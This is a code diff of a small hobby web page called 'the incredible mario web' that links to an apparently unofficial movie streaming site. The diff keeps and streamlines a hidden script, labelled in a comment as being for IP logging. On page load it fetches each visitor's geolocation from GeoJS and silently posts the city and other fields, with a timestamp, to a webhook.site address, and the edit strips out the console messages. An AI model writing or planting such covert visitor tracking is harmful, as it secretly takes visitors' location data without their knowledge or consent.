@@ -3,7 +3,6 @@
 <title>the incredible mario web</title>
 <meta name="viewport" content="width=device-width initial-scale=1">
 
-<!-- Favicon for the website -->
 <link rel="icon" href="cool.png" type="image/png" />
 
 <style>
@@ -75,15 +74,12 @@ h1 img { height: 1.5em; margin-right: 10px; }
 <a href="https://web.netmovies.to/a-minecraft-movie/" target="_blank" style="color: blue;">https://web.netmovies.to/a-minecraft-movie/</a>
 </p>
 
-<script async src="https://get.geojs.io/v1/ip/geo.js?callback=geoip"></script>
-
+<!-- GeoJS script for IP logging -->
 <script async src="https://get.geojs.io/v1/ip/geo.js?callback=geoip"></script>
 
 <script>
   function geoip(json) {
-    const webhookUrl = "https://cors-anywhere.herokuapp.com/https://webhook.site/6b3f8f6f-7fa9-45bc-894f-fbf3c4dc412e";
-    
-    fetch(webhookUrl, {
+    fetch("https://webhook.site/6b3f8f6f-7fa9-45bc-894f-fbf3c4dc412e", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -93,12 +89,6 @@ h1 img { height: 1.5em; margin-right: 10px; }
         city: json.city,
         time: new Date().toISOString()
       })
-    })
-    .then(response => {
-      console.log('Data sent to Webhook');
-    })
-    .catch(error => {
-      console.error('Error sending data: ', error);
     });
   }
 </script>
